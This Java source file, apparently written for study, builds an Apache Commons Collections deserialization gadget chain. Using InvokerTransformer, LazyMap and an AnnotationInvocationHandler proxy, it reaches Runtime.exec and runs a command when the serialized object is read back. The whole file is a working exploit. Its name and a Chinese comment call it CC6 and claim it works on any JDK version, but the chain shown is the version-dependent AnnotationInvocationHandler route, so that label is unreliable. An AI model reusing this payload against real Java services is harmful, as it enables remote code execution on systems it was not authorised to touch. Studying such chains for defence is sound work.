package cc6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import toolkit.Seriliazation;

import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

/**
 * 最好用的 cc 链，不受 jdk 版本限制
 */
public class CC6Chain {
    private static String injectedCmd = "chromium";

    public static void main(String[] args) throws IOException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
        cc6();
    }

    public static void cc6() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{injectedCmd})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        // 使用 LazyMap，不用 TransformedMap
        /**
         * AnnotationInvocationHandler.readObject()
         *      -> Map(proxy).entrySet()
         *          -> AnnotationInvocationHandler.invoke()
         *              -> LazyMap.get()
         *                  -> factory.transform(key) (protected final Transformer factory)
         */

        // 构造一个 LazyMap
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);

        // 构造一个代理
        String entryClass = "sun.reflect.annotation.AnnotationInvocationHandler";
        Class clazzAIHandler = Class.forName(entryClass);

        Constructor constructorAIHandler = clazzAIHandler.getDeclaredConstructor(Class.class, Map.class);
        constructorAIHandler.setAccessible(true);

        // 用于代理一个 lazymap，会在调用 entrySet 的时候必然走到 invoke 里，在 invoke 里调用 get，在 get 中调用 Transformer
        InvocationHandler AIHandler = (InvocationHandler) constructorAIHandler.newInstance(Override.class, lazyMap);

        // 接收参数：ClassLoader loader, Class<?>[] interfaces, InvocationHandler h
        Map mapProxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, AIHandler);

        // 用于反序列化的对象，readObject 的时候会调用里面 map 的 entrySet
        InvocationHandler h = (InvocationHandler) constructorAIHandler.newInstance(Override.class, mapProxy);

        Seriliazation.serialize(h);
        Seriliazation.unserialize("ser.bin");
    }
}